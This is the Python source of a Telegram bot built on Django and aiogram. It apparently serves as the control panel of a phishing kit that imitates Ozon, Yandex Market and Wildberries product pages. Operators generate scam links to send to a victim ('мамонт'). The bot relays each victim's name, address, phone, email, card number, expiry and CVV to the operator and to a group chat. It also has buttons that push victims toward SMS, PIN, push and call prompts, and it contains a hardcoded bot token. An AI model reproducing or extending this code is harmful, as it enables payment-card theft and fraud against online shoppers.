import os
import string
from asyncio import get_event_loop
from random import choice

from asgiref.sync import sync_to_async

from django.conf import settings
from django.core.management.base import BaseCommand

from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery
from aiogram import Bot, Dispatcher, executor, types
from skam.models import Link
import datetime


os.environ["DJANGO_ALLOW_ASYNC_UNSAFE"] = "true"
# bot = Bot(token=settings.BOT_TOKEN)
PROXY_URL = "http://proxy.server:3128"
bot: Bot = Bot(token='5827722696:AAF8oYRwbH769qbZNv-DEqPuWkAN3LB_0Ik')


shop_btn = [
            'ozon',
            'yandex',
            'wildberies'
                ]


class LinkData(StatesGroup):
    shop = State()
    image = State()
    product_name = State()
    price = State()
    description = State()



def log_errors(f) -> any:
    def inner(*args, **kwargs) -> any:
        try:
            return f(*args, **kwargs)
        except Exception as e:
            error_message: str = f'Произошла ошибка: {e}'
            print(error_message)

            raise e

    return inner


@log_errors
async def log_submit(link_id: int, address: str, fio: str, phone: str, email: str, comment: str, cardnumber: str, card_data: str, card_data_2: str, cvv: str, link_str: str = '') -> None:
    txt = f"""
        🌐 Платформа: OZON
         ID: {link_id}
         Адрес: {address}
         ФИО: {fio}
         Номер Телефона: {phone}
         Email: {email}
         Комментарий: {comment}
         Номер карты: {cardnumber}
         Срок действия: {card_data}/{card_data_2}
         CVV: {cvv}

"""

    keyboard = types.InlineKeyboardMarkup()
    # keyboard.add(types.InlineKeyboardButton(text="✔Вводит карту✔", callback_data="a"))
    # keyboard.row(
    #    types.InlineKeyboardButton(text="❌Отказаться❌", callback_data="a"),
    #    types.InlineKeyboardButton(text="✅Залёт✅", callback_data="a")
    # )
    keyboard.row(
        types.InlineKeyboardButton(text="📧SMS📧", callback_data=f"sms!{link_str}"),
        types.InlineKeyboardButton(text="🔘PUSH🔘", callback_data=f"push!{link_str}"),
        types.InlineKeyboardButton(text="🔃LOADER🔃", callback_data=f"loader!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="🔑PIN🔑", callback_data=f"pin!{link_str}"),
        types.InlineKeyboardButton(text="📞ЗВОНОК📞", callback_data=f"call!{link_str}")
    )
    keyboard.row(
        types.InlineKeyboardButton(text="💳КАРТА💳", callback_data=f"card!{link_str}"),
        types.InlineKeyboardButton(text="🗳Главная🗳", callback_data=f"main!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="✔УСПЕХ✔", callback_data=f"suc!{link_str}"),
        types.InlineKeyboardButton(text="❌Отказаться❌", callback_data=f"cancel!{link_str}"),
        types.InlineKeyboardButton(text="❌Сброс❌", callback_data=f"otm!{link_str}"),)

    link: Link = Link.objects.get(link=link_str)

    await bot.send_message(
            chat_id=link.tg_id,
            text=txt, reply_markup=keyboard)

    await bot.send_message(
            chat_id=-1001819537554,
            text=txt)


@log_errors
async def log_submit_y(link_id: int, address: str, flat: str, firstname: str, lastname: str, middlename: str, fio: str, phone: str, email: str, cardnumber: str,
 card_data: str, card_data_2: str, cvv: str, link_str: str = '') -> None:
    txt = f"""
        🌐 Платформа: YANDEX
         ID: {link_id}
         Адрес: {address}
         Офис: {flat}
         Firstname: {firstname}
         Lastname: {lastname}
         Middlename: {middlename}
         FIO: {fio}
         Номер Телефона: {phone}
         Email: {email}
         Номер карты: {cardnumber}
         Срок действия: {card_data}/{card_data_2}
         CVV: {cvv}

"""
    

    keyboard = types.InlineKeyboardMarkup()
    # keyboard.add(types.InlineKeyboardButton(text="✔Вводит карту✔", callback_data="a"))
    # keyboard.row(
    #    types.InlineKeyboardButton(text="❌Отказаться❌", callback_data="a"),
    #    types.InlineKeyboardButton(text="✅Залёт✅", callback_data="a")
    # )
    keyboard.row(
        types.InlineKeyboardButton(text="📧SMS📧", callback_data=f"sms!{link_str}"),
        types.InlineKeyboardButton(text="🔘PUSH🔘", callback_data=f"push!{link_str}"),
        types.InlineKeyboardButton(text="🔃LOADER🔃", callback_data=f"loader!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="🔑PIN🔑", callback_data=f"pin!{link_str}"),
        types.InlineKeyboardButton(text="📞ЗВОНОК📞", callback_data=f"call!{link_str}")
    )
    keyboard.row(
        types.InlineKeyboardButton(text="💳КАРТА💳", callback_data=f"card!{link_str}"),
        types.InlineKeyboardButton(text="🗳Главная🗳", callback_data=f"main!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="✔УСПЕХ✔", callback_data=f"suc!{link_str}"),
        types.InlineKeyboardButton(text="❌Отказаться❌", callback_data=f"cancel!{link_str}"),
        types.InlineKeyboardButton(text="❌Сброс❌", callback_data=f"otm!{link_str}"),)

    link: Link = Link.objects.get(link=link_str)

    await bot.send_message(
            chat_id=link.tg_id,
            text=txt, reply_markup=keyboard)

    await bot.send_message(
            chat_id=-1001819537554,
            text=txt)



@log_errors
async def log_submit_w(link_id: int, address: str, firstname: str, lastname: str, phone: str, email: str, cardnumber: str, card_data: str, card_data_2: str, cvv: str, fio: str, link_str: str = '') -> None:
    txt = f"""
        🌐 Платформа: WILDBERIES
         ID: {link_id}
         Адрес: {address}
         ФИО: {fio} 
         Firstname: {firstname}
         Lastname: {lastname}
         Номер Телефона: {phone}
         Email: {email}
         Номер карты: {cardnumber}
         Срок действия: {card_data}/{card_data_2}
         CVV: {cvv}

"""

    keyboard = types.InlineKeyboardMarkup()
    # keyboard.add(types.InlineKeyboardButton(text="✔Вводит карту✔", callback_data="a"))
    # keyboard.row(
    #    types.InlineKeyboardButton(text="❌Отказаться❌", callback_data="a"),
    #    types.InlineKeyboardButton(text="✅Залёт✅", callback_data="a")
    # )
    keyboard.row(
        types.InlineKeyboardButton(text="📧SMS📧", callback_data=f"sms!{link_str}"),
        types.InlineKeyboardButton(text="🔘PUSH🔘", callback_data=f"push!{link_str}"),
        types.InlineKeyboardButton(text="🔃LOADER🔃", callback_data=f"loader!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="🔑PIN🔑", callback_data=f"pin!{link_str}"),
        types.InlineKeyboardButton(text="📞ЗВОНОК📞", callback_data=f"call!{link_str}")
    )
    keyboard.row(
        types.InlineKeyboardButton(text="💳КАРТА💳", callback_data=f"card!{link_str}"),
        types.InlineKeyboardButton(text="🗳Главная🗳", callback_data=f"main!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="✔УСПЕХ✔", callback_data=f"suc!{link_str}"),
        types.InlineKeyboardButton(text="❌Отказаться❌", callback_data=f"cancel!{link_str}"),
        types.InlineKeyboardButton(text="❌Сброс❌", callback_data=f"otm!{link_str}"),)

    link: Link = Link.objects.get(link=link_str)

    await bot.send_message(
            chat_id=link.tg_id,
            text=txt, reply_markup=keyboard)

    await bot.send_message(
            chat_id=-1001819537554,
            text=txt)



@log_errors
async def log_user_action(action: str, link_id: str) -> None:
    link: Link = Link.objects.get(link=link_id)
    await bot.send_message(chat_id=link.tg_id, text=f"Сообщение от : {link_id} \n" + action)



@log_errors
async def start_handler(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    key = types.ReplyKeyboardMarkup()
    key.add(types.KeyboardButton('✏️ Создать ссылку'))
    key.add(types.KeyboardButton('🔗 Активные ссылки'))


    await message.answer(
        text=f"Привет, {message.from_user.first_name}, создай ссылку, чтобы работать со мной :)",
        reply_markup=key
        )     



@log_errors
async def create_link(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    key = types.ReplyKeyboardMarkup()
    key.add(shop_btn[0], shop_btn[1], shop_btn[2])

    await LinkData.shop.set()
    await message.answer(
        text=f'Выберите платформу',
        reply_markup=key
        )


@log_errors
async def create_link_2(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['shop'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id,
        text=f'Введите ссылку на изображение',

        )

@log_errors
async def create_link_3(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['image'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id,
        text=f'Введите название товара',

        )


@log_errors
async def create_link_4(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['product_name'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id,
        text=f'Введите цену товара',

        )


@log_errors
async def create_link_5(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['price'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id, text=f'Введите описание товара по шаблону: Свойство:значение|Свойство:значение|Свойство:значение и так далее')


@log_errors
async def create_link_6(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['description'] = message.parse_entities()  
        link_str: str = ''.join([choice(list(string.ascii_letters)) for i in range(10)])
        Link.objects.create(tg_id=message.from_user.id, link=link_str, status=0, image_link=data['image'], shop=data['shop'], price=data['price'], product_name=data['product_name'], product_description=data['description'])
        await message.answer(
        f'Создал ссылку : domen/s/{link_str} \nСкинь ее мамонту и отслеживай его действия',

        )
        await state.finish()


@log_errors
async def all_links(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    all_link = Link.objects.filter(tg_id=message.from_user.id).values_list('link', flat=True).distinct()
    for i in range(len(all_link)):
        key = keyboard = types.InlineKeyboardMarkup()
        key.row(types.InlineKeyboardButton(text="УДАЛИТЬ", callback_data=f"delete!{all_link[i]}"))
        await message.answer(text=f'fondzaschita.com/s/{all_link[i]}',
                            reply_markup=key)

    await message.answer(f'Всего найдено {len(all_link)} ссылок')



@log_errors
async def delete_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    dlt = Link.objects.get(link=callback.data.split("!")[1])
    dlt.delete()
    await callback.answer("Ссылка удалена")
    await bot.delete_message(chat_id=callback.from_user.id, message_id=callback.message.message_id)




@log_errors
async def sms_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 1
    link.save()
    await callback.answer("Ожидайте")



@log_errors
async def main_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 8
    link.save()
    await callback.answer("Ожидайте")



@log_errors
async def otm_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 0
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def suc_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 6
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def push_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 7
    link.save()
    await callback.answer("Ожидайте")




@log_errors
async def call_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 5
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def cancel(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 9
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def pin_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 3
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def loader_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 4
    link.save()
    await callback.answer("Ожидайте")



@log_errors
async def card_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 2
    link.save()
    await callback.answer("Ожидайте")



class Command(BaseCommand):
    help = 'Telegram bot'

    def handle(self, *args, **kwargs) -> None:
        dp: Dispatcher = Dispatcher(bot, loop=get_event_loop(), storage=MemoryStorage())
        dp.register_message_handler(all_links, text="🔗 Активные ссылки")
        dp.register_callback_query_handler(delete_handler, lambda x: "delete" in x.data)
        dp.register_message_handler(start_handler, commands=['start'])
        dp.register_message_handler(create_link, text="✏️ Создать ссылку")
        dp.register_message_handler(create_link_2, state=LinkData.shop)
        dp.register_message_handler(create_link_3, state=LinkData.image)
        dp.register_message_handler(create_link_4, state=LinkData.product_name)
        dp.register_message_handler(create_link_5, state=LinkData.price)
        dp.register_message_handler(create_link_6, state=LinkData.description)
        dp.register_callback_query_handler(call_handler, lambda x: "call" in x.data)
        dp.register_callback_query_handler(suc_handler, lambda x: "suc" in x.data)
        dp.register_callback_query_handler(push_handler, lambda x: "push" in x.data)
        dp.register_callback_query_handler(main_handler, lambda x: "main" in x.data)
        dp.register_callback_query_handler(otm_handler, lambda x: "otm" in x.data)
        dp.register_callback_query_handler(cancel, lambda x: "cancel" in x.data)
        dp.register_callback_query_handler(sms_handler, lambda x: "sms" in x.data)
        dp.register_callback_query_handler(pin_handler, lambda x: "pin" in x.data)
        dp.register_callback_query_handler(card_handler, lambda x: "card" in x.data)
        dp.register_callback_query_handler(loader_handler, lambda x: "loader" in x.data)

        executor.start_polling(dp, skip_updates=True)



